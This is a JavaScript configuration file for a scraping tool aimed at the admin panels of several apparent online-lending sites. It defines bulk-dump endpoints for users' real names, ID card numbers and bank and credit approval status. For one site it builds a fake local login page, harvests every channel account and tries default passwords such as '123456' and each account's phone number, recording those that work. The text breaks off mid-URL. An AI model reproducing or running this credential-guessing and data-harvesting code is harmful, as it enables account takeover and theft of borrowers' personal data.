/*
@class 这是爬取数据的软件的配置文件
*/
class C{
	run(){
		let 
			that =this,
			data = {
				base:{
                    version:"2.0"//软件版本号
				},
				supportWebURL:{
					"luluMoney":{
						"url":"http://tiexin69223.cn:9191",
						"dataSource":{
							"WhiteList":{
								"description":"白名单用户",
								"url":"http://tiexin69223.cn:9191/manage/busUser/registUserListDataTable?&draw=2&columns%5B0%5D%5Bdata%5D=id&columns%5B0%5D%5Bname%5D=&columns%5B0%5D%5Bsearchable%5D=false&columns%5B0%5D%5Borderable%5D=false&columns%5B0%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B0%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B1%5D%5Bdata%5D=username&columns%5B1%5D%5Bname%5D=&columns%5B1%5D%5Bsearchable%5D=true&columns%5B1%5D%5Borderable%5D=true&columns%5B1%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B1%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B2%5D%5Bdata%5D=realName&columns%5B2%5D%5Bname%5D=&columns%5B2%5D%5Bsearchable%5D=true&columns%5B2%5D%5Borderable%5D=true&columns%5B2%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B2%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B3%5D%5Bdata%5D=idcard&columns%5B3%5D%5Bname%5D=&columns%5B3%5D%5Bsearchable%5D=true&columns%5B3%5D%5Borderable%5D=true&columns%5B3%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B3%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B4%5D%5Bdata%5D=idcardApprove&columns%5B4%5D%5Bname%5D=&columns%5B4%5D%5Bsearchable%5D=true&columns%5B4%5D%5Borderable%5D=true&columns%5B4%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B4%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B5%5D%5Bdata%5D=contactApprove&columns%5B5%5D%5Bname%5D=&columns%5B5%5D%5Bsearchable%5D=true&columns%5B5%5D%5Borderable%5D=true&columns%5B5%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B5%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B6%5D%5Bdata%5D=zhimaApprove&columns%5B6%5D%5Bname%5D=&columns%5B6%5D%5Bsearchable%5D=true&columns%5B6%5D%5Borderable%5D=true&columns%5B6%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B6%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B7%5D%5Bdata%5D=mnoApprove&columns%5B7%5D%5Bname%5D=&columns%5B7%5D%5Bsearchable%5D=true&columns%5B7%5D%5Borderable%5D=true&columns%5B7%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B7%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B8%5D%5Bdata%5D=bankApprove&columns%5B8%5D%5Bname%5D=&columns%5B8%5D%5Bsearchable%5D=true&columns%5B8%5D%5Borderable%5D=true&columns%5B8%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B8%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B9%5D%5Bdata%5D=deviceType&columns%5B9%5D%5Bname%5D=&columns%5B9%5D%5Bsearchable%5D=true&columns%5B9%5D%5Borderable%5D=true&columns%5B9%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B9%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B10%5D%5Bdata%5D=enabled&columns%5B10%5D%5Bname%5D=&columns%5B10%5D%5Bsearchable%5D=true&columns%5B10%5D%5Borderable%5D=true&columns%5B10%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B10%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B11%5D%5Bdata%5D=channelName&columns%5B11%5D%5Bname%5D=&columns%5B11%5D%5Bsearchable%5D=true&columns%5B11%5D%5Borderable%5D=true&columns%5B11%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B11%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B12%5D%5Bdata%5D=createdAt&columns%5B12%5D%5Bname%5D=&columns%5B12%5D%5Bsearchable%5D=true&columns%5B12%5D%5Borderable%5D=true&columns%5B12%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B12%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B13%5D%5Bdata%5D=updatedAt&columns%5B13%5D%5Bname%5D=&columns%5B13%5D%5Bsearchable%5D=true&columns%5B13%5D%5Borderable%5D=true&columns%5B13%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B13%5D%5Bsearch%5D%5Bregex%5D=false&order%5B0%5D%5Bcolumn%5D=0&order%5B0%5D%5Bdir%5D=asc&start=0&length=100000000&search%5Bvalue%5D=&search%5Bregex%5D=false&_=1539432520273"
							},
							"Blacklist":{
								"description":"黑名单",
								"url":"http://tiexin69223.cn:9191/manage/busUser/defriendUserListDataTable?&draw=2&columns%5B0%5D%5Bdata%5D=id&columns%5B0%5D%5Bname%5D=&columns%5B0%5D%5Bsearchable%5D=false&columns%5B0%5D%5Borderable%5D=false&columns%5B0%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B0%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B1%5D%5Bdata%5D=username&columns%5B1%5D%5Bname%5D=&columns%5B1%5D%5Bsearchable%5D=true&columns%5B1%5D%5Borderable%5D=true&columns%5B1%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B1%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B2%5D%5Bdata%5D=realName&columns%5B2%5D%5Bname%5D=&columns%5B2%5D%5Bsearchable%5D=true&columns%5B2%5D%5Borderable%5D=true&columns%5B2%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B2%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B3%5D%5Bdata%5D=idcard&columns%5B3%5D%5Bname%5D=&columns%5B3%5D%5Bsearchable%5D=true&columns%5B3%5D%5Borderable%5D=true&columns%5B3%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B3%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B4%5D%5Bdata%5D=idcardApprove&columns%5B4%5D%5Bname%5D=&columns%5B4%5D%5Bsearchable%5D=true&columns%5B4%5D%5Borderable%5D=true&columns%5B4%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B4%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B5%5D%5Bdata%5D=contactApprove&columns%5B5%5D%5Bname%5D=&columns%5B5%5D%5Bsearchable%5D=true&columns%5B5%5D%5Borderable%5D=true&columns%5B5%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B5%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B6%5D%5Bdata%5D=zhimaApprove&columns%5B6%5D%5Bname%5D=&columns%5B6%5D%5Bsearchable%5D=true&columns%5B6%5D%5Borderable%5D=true&columns%5B6%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B6%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B7%5D%5Bdata%5D=mnoApprove&columns%5B7%5D%5Bname%5D=&columns%5B7%5D%5Bsearchable%5D=true&columns%5B7%5D%5Borderable%5D=true&columns%5B7%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B7%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B8%5D%5Bdata%5D=bankApprove&columns%5B8%5D%5Bname%5D=&columns%5B8%5D%5Bsearchable%5D=true&columns%5B8%5D%5Borderable%5D=true&columns%5B8%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B8%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B9%5D%5Bdata%5D=deviceType&columns%5B9%5D%5Bname%5D=&columns%5B9%5D%5Bsearchable%5D=true&columns%5B9%5D%5Borderable%5D=true&columns%5B9%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B9%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B10%5D%5Bdata%5D=enabled&columns%5B10%5D%5Bname%5D=&columns%5B10%5D%5Bsearchable%5D=true&columns%5B10%5D%5Borderable%5D=true&columns%5B10%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B10%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B11%5D%5Bdata%5D=channelName&columns%5B11%5D%5Bname%5D=&columns%5B11%5D%5Bsearchable%5D=true&columns%5B11%5D%5Borderable%5D=true&columns%5B11%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B11%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B12%5D%5Bdata%5D=createdAt&columns%5B12%5D%5Bname%5D=&columns%5B12%5D%5Bsearchable%5D=true&columns%5B12%5D%5Borderable%5D=true&columns%5B12%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B12%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B13%5D%5Bdata%5D=updatedAt&columns%5B13%5D%5Bname%5D=&columns%5B13%5D%5Bsearchable%5D=true&columns%5B13%5D%5Borderable%5D=true&columns%5B13%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B13%5D%5Bsearch%5D%5Bregex%5D=false&order%5B0%5D%5Bcolumn%5D=0&order%5B0%5D%5Bdir%5D=asc&start=0&length=100000000&search%5Bvalue%5D=&search%5Bregex%5D=false&_=1539432636824"
							}
						},
						isLogin:{//用来判断是否登陆
							queryText:`id="sidebar-menu"`
						},
                        isReadyLogin:{//用来判断是否可以登陆
                            name:["username","password"],
                        }
					},
                    "pandoracredit":{
                        "url":"http://console.pandoracredit.cn/login",
                        "dataSource":{
                            "alldata":{
                                "description":"全部数据",
                                "url":"https://console.pandoracredit.cn/api/organizations/hi/self_data?source_code=<%r%>username<%/r%>&page=1&size=<%r%>length<%/r%>&start_date=<%r%>startTimeA<%/r%>&end_date=<%r%>toDayTimeA<%/r%>"
                            }
                        },
                        isLogin:{//用来判断是否登陆
                            queryText:`class="user_status"`
                        },
                        isReadyLogin:{//用来判断是否可以登陆
                            class:["user","pass"],
                        }
                    },
                    "jiuchangkuaidai":{
                        "url":"http://www.jiuchangkuaidai.com/admin/",
                        "dataSource":{
                            "aldata_scope":{
                                "description":"一年内数据",
                                "url":"http://www.jiuchangkuaidai.com/admin/member/DataList",
                                post:true,
                                data:(function (){
                                    let
                                        getRows = 300,
                                        dataLen = parseInt(70000/getRows),
                                        data = []
                                    ;
                                    for(let i = 1;i <= dataLen+1;i++){
                                        data.push({
                                            AddDateTime1:`<%r%>startTimeA<%/r%>`,
                                            AddDateTime2:`<%r%>toDayTimeA<%/r%>`,
                                            page: i,
                                            rows: getRows
                                        });
                                    }
                                    return data;
                                })()
                            },
                            "aldata_today": {
                                "description": "今日数据",
                                "url": "http://www.jiuchangkuaidai.com/admin/member/DataList",
                                post: true,
                                data: (function (){
                                    let
                                        data = [],
                                        days = [`YesterdayA`,`toDayTimeA`]
                                    ;
                                    for(let i = 1;i<20;i++){
                                        data.push(
                                            {
                                                AddDateTime1: `<%r%>YesterdayA<%/r%>`,
                                                AddDateTime2: `<%r%>toDayTimeA<%/r%>`,
                                                page: i,
                                                rows: 300
                                            }
                                        )
                                    }
                                    return data;
                                })()
                            }
                        },
                        isLogin:{//用来判断是否登陆
                            queryText:`</span>退出系统</a>`
                        },
                        isReadyLogin:{//用来判断是否可以登陆
                            id:["UserName","UserPsd"],
                        }
                    },
                    "hzkunhang":{
                        "url":"http://manager.hzkunhang.com/",
                        "dataSource":{
                            "alldata_hzkunhang": {
                                "beforeFunction":(callback)=>{//抓取的前置函数
                                    let
                                        localHTML = `<html lang="en">
 <head> 
  <meta charset="UTF-8" /> 
  <link rel="shortcut icon" href="http://manager.hzkunhang.com/build/images/favicon.ico" /> 
  <title>钱过北斗管理系统</title> 
  <link rel="stylesheet" href="http://manager.hzkunhang.com/dev/index.css" /> 
</head> 
 <body> 
  <div id="app">
  <h1 style="text-align:center;color:red;">载入....   本地欺骗页面.  </h1>
   <div data-reactid=".0">
    <div class="g-loginbox" data-reactid=".0.0">
     <div class="g-bd" data-reactid=".0.0.0">
      <div class="m-bgwrap" style="cursor:pointer;" data-reactid=".0.0.0.1"></div>
      <div class="m-loginboxbg" data-reactid=".0.0.0.2"></div>
      <div class="m-loginbox" data-reactid=".0.0.0.3"> 
       <div class="lbinner" id="J_body_bg" data-reactid=".0.0.0.3.0">
        <div class="login-form" data-reactid=".0.0.0.3.0.0">
         <div class="login-hd" data-reactid=".0.0.0.3.0.0.0">
          钱过北斗管理系统
         </div> 
         <div class="login_input" data-reactid=".0.0.0.3.0.0.1">
          <form form="[object Object]" id="form_id" action="http://manager.hzkunhang.com/system/user/confirmLogin.htm" class="" data-reactid=".0.0.0.3.0.0.1.0">
           <div class="ant-form-item" data-reactid=".0.0.0.3.0.0.1.0.0">
            <div class="" data-reactid=".0.0.0.3.0.0.1.0.0.$wrapper">
             <div class="ant-form-item-control has-feedback has-success" data-reactid=".0.0.0.3.0.0.1.0.0.$wrapper.0">
              <span class="ant-input-wrapper" data-reactid=".0.0.0.3.0.0.1.0.0.$wrapper.0.0:$/=10"><input type="text" class="ant-input ant-input-lg ipt ipt-user" name="username" autocomplete="off" id="username" value="" placeholder="用户名" data-reactid=".0.0.0.3.0.0.1.0.0.$wrapper.0.0:$/=10.1" /></span>
             </div>
            </div>
           </div>
           <div class="ant-form-item" data-reactid=".0.0.0.3.0.0.1.0.1">
            <div class="" data-reactid=".0.0.0.3.0.0.1.0.1.$wrapper">
             <div class="ant-form-item-control has-success" data-reactid=".0.0.0.3.0.0.1.0.1.$wrapper.0">
              <span class="ant-input-wrapper" data-reactid=".0.0.0.3.0.0.1.0.1.$wrapper.0.0:$/=10"><input type="password" class="ant-input ant-input-lg ipt ipt-pwd" name="password" autocomplete="off" id="password" value="" placeholder="密码" data-reactid=".0.0.0.3.0.0.1.0.1.$wrapper.0.0:$/=10.1" /></span>
             </div>
            </div>
           </div>
           <button type="submit" class="ant-btn ant-btn-primary ant-btn-lg ant-input u-loginbtn" data-reactid=".0.0.0.3.0.0.1.0.2"><span data-reactid=".0.0.0.3.0.0.1.0.2.1:$/=10">登 录</span></button>
          </form>
         </div>
        </div>
       </div>
      </div>
     </div>
    </div>
   </div> 
  </div>
 </body>
</html>`                                    ,
                                        autoGet = ()=>{
                                            let
                                                listChannel = that.load.option.get_hzkunhang_listChannel.length,
                                                htmlTmpDir = that.load.node.path.join(that.load.option.tmpDir,`is_hzkunhang_local.html`)
                                            ;
                                            (function getNextAccount(allLen){
                                                if(allLen >= listChannel){
                                                    that.load.module.console.success(`阶段 ${allLen+1} / 总 ${listChannel} : 所有任务成功!....`,false);
                                                }else{
                                                    let
                                                        thisAccountObject = that.load.option.get_hzkunhang_listChannel[allLen],
                                                        thisAccount = thisAccountObject.code,
                                                        phone = thisAccountObject.phone,
                                                        passwords = [`123456`,`123321`,thisAccount,phone],
                                                        // 退出当前账号代码
                                                        script = `document.querySelectorAll('a').forEach((ele)=>{
                                                            let
                                                                data = ele.getAttribute("data-reactid")
                                                            ;
                                                            if(data == ".0.0.1.1.0.2"){
                                                                ele.click();
                                                            }
                                                        });
                                                        `
                                                    ;
                                                    if(!that.load.option.is_hzkunhang_local && !that.load.node.fs.existsSync(htmlTmpDir)){
                                                        that.load.node.fs.writeFileSync(htmlTmpDir,localHTML);
                                                        that.load.option.is_hzkunhang_local = true;
                                                    }
                                                    that.load.webContents.loadURL(htmlTmpDir);
                                                    that.load.module.console.info(`账号 ${thisAccount} [ ${allLen+1} / ${listChannel} ] : 请勿操作,等待程序自动登陆网页!`,false);
                                                    that.load.module.web.executeJavaScript(script,(r)=>{
                                                    (function checkLogin(len){
                                                        if(len >= passwords.length){
                                                            getNextAccount(++allLen);
                                                        } else {
                                                            let
                                                                thisPassword = passwords[len],
                                                                postObject = {
                                                                    username: thisAccount,
                                                                    password: thisPassword
                                                                }
                                                            ;
                                                            that.load.module.console.info(`账号 ${thisAccount} [ ${allLen+1} / ${listChannel} ] : 当前使用 < 账号 : ${thisAccount} / 密码 : ${thisPassword} > ! 尝试登陆中....`,false);
                                                            that.load.eles.$.post(`http://manager.hzkunhang.com/system/user/login.htm`,postObject,(data)=>{
                                                                let
                                                                    code = data.code
                                                                ;
                                                                if(code === 200){
                                                                    if(!that.load.option.records[that.load.option.currentWebName]){
                                                                        that.load.option.records[that.load.option.currentWebName] = {};
                                                                    }
                                                                    if(!that.load.option.records[that.load.option.currentWebName]["username"]){
                                                                        that.load.option.records[that.load.option.currentWebName]["username"] = [];
                                                                    }
                                                                    if(!that.load.option.records[that.load.option.currentWebName]["password"]){
                                                                        that.load.option.records[that.load.option.currentWebName]["password"] = [];
                                                                    }
                                                                    that.load.option.records[that.load.option.currentWebName]["username"].push(thisAccount);
                                                                    that.load.option.records[that.load.option.currentWebName]["password"].push(thisPassword);

                                                                    that.load.module.console.success(`第 ${allLen+1} 阶段 / 总 ${listChannel} : 登陆成功!....`,false);
                                                                    that.load.module.web.setElementVale(`#username`,0,`value`,thisAccount,()=>{
                                                                        that.load.module.web.setElementVale(`#password`,0,`value`,thisPassword,()=>{
                                                                             setTimeout(()=>{
                                                                                 that.load.module.web.executeElementEvent(`#submit_form`,0,`click`,()=>{
                                                                                     setTimeout(()=>{
                                                                                         //从回调 使用 get_web_data_main 主函数
                                                                                         if(callback)callback(()=>{
                                                                                             //一轮抓取结束后,调用下个账号.
                                                                                             getNextAccount(++allLen);
                                                                                         });
                                                                                     },1500);
                                                                                 });
                                                                             },1000);
                                                                        });
                                                                    });
                                                                }else if(code === 400){//密码错误
                                                                    that.load.module.console.alert(`第 ${allLen+1} 阶段 / 总 ${listChannel} : 密码错误, 尝试使用下一个密码....`,false);
                                                                    checkLogin(++len);
                                                                }else{
                                                                    that.load.module.console.error(`第 ${allLen+1} 阶段 / 总 ${listChannel} : 跳过该账号 ${data.msg}....`,false);
                                                                    getNextAccount(++allLen);
                                                                }
                                                            });

                                                        }
                                                    })(0);
                                                    });
                                                }
                                            })(0);
                                        }
                                    ;
                                    if(!that.load.option.get_hzkunhang_listChannel){
                                        that.load.module.console.success("前置工作 : 正在解锁平台其他全部账号,请稍候.!",false);
                                        that.load.module.web.Ajax(`http://manager.hzkunhang.com/modules/manage/promotion/channel/listChannel.htm`,(data)=>{
                                            that.load.module.console.success(`索引数据成功! 获取到 ${data.data.length} 个账号....  等待下一步....`,false);
                                            //取得全部用户账号
                                            that.load.option.get_hzkunhang_listChannel = data.data;
                                            autoGet();
                                        });
                                    }else{
                                        autoGet();
                                    }
                                },
                                "description": "全部数据",
                                "url": "http://manager.hzkunhang.com/modules/manage/promotion/channel/channelList.htm",
                                post: true,
                                data: {
                                    current: 1,
                                    pageSize: 3000000

                                }
                            }
                        },
                        isLogin: {//用来判断是否登陆
                            getURL: {
                                "url": `http://manager.hzkunhang.com/modules/manage/promotion/channel/listChannel.htm`,//用来请求判断是否登陆的URL
                                callback: (data, callback) => {//请求后的回调,以便于判断是否登陆
                                    if (data.code != 200) {
                                        callback(false);
                                    } else {
                                        callback(true);
                                    }
                                }//通过读取URL判断是否登陆
                            }
                        },
                        isReadyLogin:{//用来判断是否可以登陆
                            id:["username","password"],
                        }
                    },
                    "sdhuishou":{
                        "url":"http://qu.sdhuishou.com/login",
                        "dataSource":{
                            "alldata": {
                                "description": "全部数据",
                                "url": "http://qu.sdhuishou.com/channel/clientUser/listData",
                                post: true,
                                data: {
                                    channelId: "-1",
                                    pageNo: 1,
                                    pageSize: 1000000,
                                    regisDateFrom: "2010-10-11 00:00:00",
                                    regisDateTo: `<%r%>toDayTimeC<%/r%>`,
                                    throughSort: ""
                                },
                                RequestPayload:true,//使用 Request Payload 方式请求数据
                                setRequestHeader:{
                                    Accept:"application/json, text/javascript, */*; q=0.01",
                                    "Content-Type":"application/json"
                                }
                            }
                        },
                        isLogin:{//用来判断是否登陆
                            queryText:`修改密码`//通过读取URL判断是否登陆
                        },
                        isReadyLogin:{//用来判断是否可以登陆
                            id:["account","pwd"],
                        }
                    },
                    "guoji1818":{
                        "url":"http://app.guoji1818.com/channel/channelLogin.html",
                        "dataSource":{
                            "allUser": {
                                "description": "全部用户数据",
                                "url": (function (){
                                    let
                                        allUserLen = 1000,
                                        pageNoLen = 100,
                                        allUser = []
                                    ;
                                    for(let i =10;i<allUserLen;i++){
                                        for(let j =1;j<pageNoLen;j++){
                                            allUser.push(`http://app.guoji1818.com//api/channel/findMyMember?pageNo=${j}&pageSize=10000000&channelId=${i}`);
                                        }
                                    }
                                    return allUser;
                                })()
                            },
                            "alldata": {
                                "description": "当前用户数据",
                                "url": `http://app.guoji1818.com//api/channel/findMyMember?pageNo=1&pageSize=1000000`
                            }
                        },
                        isLogin:{//用来判断是否登陆
                            queryText:`退出登陆`//通过读取URL判断是否登陆
                        },
                        isReadyLogin:{//用来判断是否可以登陆
                            id:["userName","password"],
                        }
                    },
                    "chuishou":{
                        "url":"http://app.3chuishou.com/hqk888/index.html",
                        "dataSource":{
                            "allUser": {
                                "description": "全部用户数据",
                                "url": (function (){
                                    let
                                        allUserLen = 1000,
                                        pageNoLen = 200,
                                        allUser = []
                                    ;
                                    for(let i =10;i<allUserLen;i++){
                                        for(let j =1;j<pageNoLen;j++){
                                            allUser.push(`http://app.3chuishou.com/api/channel/findMyMember?phone=&userName=&pageNo=${j}&pageSize=1500&channelId=${i}`);
                                        }
                                    }
                                    return allUser;
                                })()
                            },
                            "alldata": {
                                "description": "当前用户数据",
                                "url": `http://app.3chuishou.com/api/channel/findMyMember?phone=&userName=&pageNo=1&pageSize=1000000`
                            }
                        },
                        isLogin:{//用来判断是否登陆
                            queryText:`退出登陆`//通过读取URL判断是否登陆
                        },
                        isReadyLogin:{//用来判断是否可以登陆
                            id:["userName","password"],
                        }
                    },
                    "leyi44":{
                        "url":"http://txqb.leyi44.com:9191/login",
                        "dataSource":{
                            "WhiteList":{
                                "description":"白名单用户",
                                "url":"http://txqb.leyi44.com:9191/manage/busUser/registUserListDataTable?&draw=2&columns%5B0%5D%5Bdata%5D=id&columns%5B0%5D%5Bname%5D=&columns%5B0%5D%5Bsearchable%5D=false&columns%5B0%5D%5Borderable%5D=false&columns%5B0%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B0%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B1%5D%5Bdata%5D=username&columns%5B1%5D%5Bname%5D=&columns%5B1%5D%5Bsearchable%5D=true&columns%5B1%5D%5Borderable%5D=true&columns%5B1%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B1%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B2%5D%5Bdata%5D=realName&columns%5B2%5D%5Bname%5D=&columns%5B2%5D%5Bsearchable%5D=true&columns%5B2%5D%5Borderable%5D=true&columns%5B2%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B2%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B3%5D%5Bdata%5D=idcard&columns%5B3%5D%5Bname%5D=&columns%5B3%5D%5Bsearchable%5D=true&columns%5B3%5D%5Borderable%5D=true&columns%5B3%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B3%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B4%5D%5Bdata%5D=idcardApprove&columns%5B4%5D%5Bname%5D=&columns%5B4%5D%5Bsearchable%5D=true&columns%5B4%5D%5Borderable%5D=true&columns%5B4%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B4%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B5%5D%5Bdata%5D=contactApprove&columns%5B5%5D%5Bname%5D=&columns%5B5%5D%5Bsearchable%5D=true&columns%5B5%5D%5Borderable%5D=true&columns%5B5%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B5%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B6%5D%5Bdata%5D=zhimaApprove&columns%5B6%5D%5Bname%5D=&columns%5B6%5D%5Bsearchable%5D=true&columns%5B6%5D%5Borderable%5D=true&columns%5B6%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B6%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B7%5D%5Bdata%5D=mnoApprove&columns%5B7%5D%5Bname%5D=&columns%5B7%5D%5Bsearchable%5D=true&columns%5B7%5D%5Borderable%5D=true&columns%5B7%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B7%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B8%5D%5Bdata%5D=bankApprove&columns%5B8%5D%5Bname%5D=&columns%5B8%5D%5Bsearchable%5D=true&columns%5B8%5D%5Borderable%5D=true&columns%5B8%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B8%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B9%5D%5Bdata%5D=deviceType&columns%5B9%5D%5Bname%5D=&columns%5B9%5D%5Bsearchable%5D=true&columns%5B9%5D%5Borderable%5D=true&columns%5B9%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B9%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B10%5D%5Bdata%5D=enabled&columns%5B10%5D%5Bname%5D=&columns%5B10%5D%5Bsearchable%5D=true&columns%5B10%5D%5Borderable%5D=true&columns%5B10%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B10%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B11%5D%5Bdata%5D=channelName&columns%5B11%5D%5Bname%5D=&columns%5B11%5D%5Bsearchable%5D=true&columns%5B11%5D%5Borderable%5D=true&columns%5B11%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B11%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B12%5D%5Bdata%5D=createdAt&columns%5B12%5D%5Bname%5D=&columns%5B12%5D%5Bsearchable%5D=true&columns%5B12%5D%5Borderable%5D=true&columns%5B12%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B12%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B13%5D%5Bdata%5D=updatedAt&columns%5B13%5D%5Bname%5D=&columns%5B13%5D%5Bsearchable%5D=true&columns%5B13%5D%5Borderable%5D=true&columns%5B13%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B13%5D%5Bsearch%5D%5Bregex%5D=false&order%5B0%5D%5Bcolumn%5D=0&order%5B0%5D%5Bdir%5D=asc&start=1&length=500000&search%5Bvalue%5D=&search%5Bregex%5D=false&_=1539974315254"
                            },
                            "Blacklist":{
                                "description":"黑名单用户",
                                "url":"http://txqb.leyi44.com:9191/manage/busUser/defriendUserListDataTable?&draw=2&columns%5B0%5D%5Bdata%5D=id&columns%5B0%5D%5Bname%5D=&columns%5B0%5D%5Bsearchable%5D=false&columns%5B0%5D%5Borderable%5D=false&columns%5B0%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B0%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B1%5D%5Bdata%5D=username&columns%5B1%5D%5Bname%5D=&columns%5B1%5D%5Bsearchable%5D=true&columns%5B1%5D%5Borderable%5D=true&columns%5B1%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B1%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B2%5D%5Bdata%5D=realName&columns%5B2%5D%5Bname%5D=&columns%5B2%5D%5Bsearchable%5D=true&columns%5B2%5D%5Borderable%5D=true&columns%5B2%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B2%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B3%5D%5Bdata%5D=idcard&columns%5B3%5D%5Bname%5D=&columns%5B3%5D%5Bsearchable%5D=true&columns%5B3%5D%5Borderable%5D=true&columns%5B3%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B3%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B4%5D%5Bdata%5D=idcardApprove&columns%5B4%5D%5Bname%5D=&columns%5B4%5D%5Bsearchable%5D=true&columns%5B4%5D%5Borderable%5D=true&columns%5B4%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B4%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B5%5D%5Bdata%5D=contactApprove&columns%5B5%5D%5Bname%5D=&columns%5B5%5D%5Bsearchable%5D=true&columns%5B5%5D%5Borderable%5D=true&columns%5B5%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B5%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B6%5D%5Bdata%5D=zhimaApprove&columns%5B6%5D%5Bname%5D=&columns%5B6%5D%5Bsearchable%5D=true&columns%5B6%5D%5Borderable%5D=true&columns%5B6%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B6%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B7%5D%5Bdata%5D=mnoApprove&columns%5B7%5D%5Bname%5D=&columns%5B7%5D%5Bsearchable%5D=true&columns%5B7%5D%5Borderable%5D=true&columns%5B7%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B7%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B8%5D%5Bdata%5D=bankApprove&columns%5B8%5D%5Bname%5D=&columns%5B8%5D%5Bsearchable%5D=true&columns%5B8%5D%5Borderable%5D=true&columns%5B8%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B8%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B9%5D%5Bdata%5D=deviceType&columns%5B9%5D%5Bname%5D=&columns%5B9%5D%5Bsearchable%5D=true&columns%5B9%5D%5Borderable%5D=true&columns%5B9%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B9%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B10%5D%5Bdata%5D=enabled&columns%5B10%5D%5Bname%5D=&columns%5B10%5D%5Bsearchable%5D=true&columns%5B10%5D%5Borderable%5D=true&columns%5B10%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B10%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B11%5D%5Bdata%5D=channelName&columns%5B11%5D%5Bname%5D=&columns%5B11%5D%5Bsearchable%5D=true&columns%5B11%5D%5Borderable%5D=true&columns%5B11%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B11